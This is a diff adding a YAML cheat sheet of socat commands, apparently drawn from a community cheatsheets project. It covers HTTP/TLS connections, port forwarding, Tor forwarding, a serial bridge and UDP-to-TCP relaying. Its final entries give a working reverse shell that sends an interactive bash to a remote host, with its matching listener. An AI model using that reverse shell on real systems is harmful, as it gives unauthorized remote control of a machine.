@@ -1,0 +1,26 @@
+# https://github.com/cheat/cheatsheets
+- name: socat
+  keybinds:
+  - name: "socat connect to http-server (port 80 on 'butzel.info')"
+    key: "socat TCP4:butzel.info:80 -"
+  - name: "connect to https-server (port 443 on 'butzel.info' with tls)"
+    key: "socat openssl:butzel.info:443 -"
+  - name: "tcp-listener (port 3180), output as hexdump (-x) and fork for new connetions"
+    key: "socat -x tcp-listen:3180,fork -"
+  - name: "practical examples:"
+#complete real working http-example:  
+#(echo -e GET / HTTP/1.1\r\nHost: butzel.info\r\n\r && sleep 1) | socat tcp4:butzel.info:80 -
+#http to httpS 'Proxy' (for an webserver without TLS-Support)
+#socat OPENSSL-LISTEN:443,reuseaddr,pf=ip4,fork,cert=server.pem,cafile=client.crt,verify=0 TCP4-CONNECT:127.0.0.1:80
+  - name: "port forwarding (e.g. own port 3180 to port 22(ssh) on target"
+    key: "socat TCP4-LISTEN:3180,reuseaddr,fork TCP4:butzel.info:ssh"
+  - name: "TOR-forwarding (needs tor-daemon on port 9050 running)"
+    key: "socat tcp4-listen:8080,reuseaddr,fork socks4A:127.0.0.1:t0rhidd3ns3rvice.onion:80,socksport=9050"
+  - name: "network (port 8266) to serial bridge (/dev/ttyUSB0 baudrate: 115200)"
+    key: "socat TCP4-LISTEN:8266,fork,reuseaddr /dev/ttyUSB0,raw,crnl,b115200"
+  - name: "udp to tcp"
+    key: "socat -u udp-recvfrom:1234,fork tcp:localhost:4321"
+  - name: "reverse shell:"
+    key: "socat exec:'bash -i',pty,stderr tcp:remote.butzel.info:3180"
+  - name: "listener for above reverse shell (on remote.butzel.info):"
+    key: "socat file:`tty`,raw,echo=0 tcp-listen:3180"
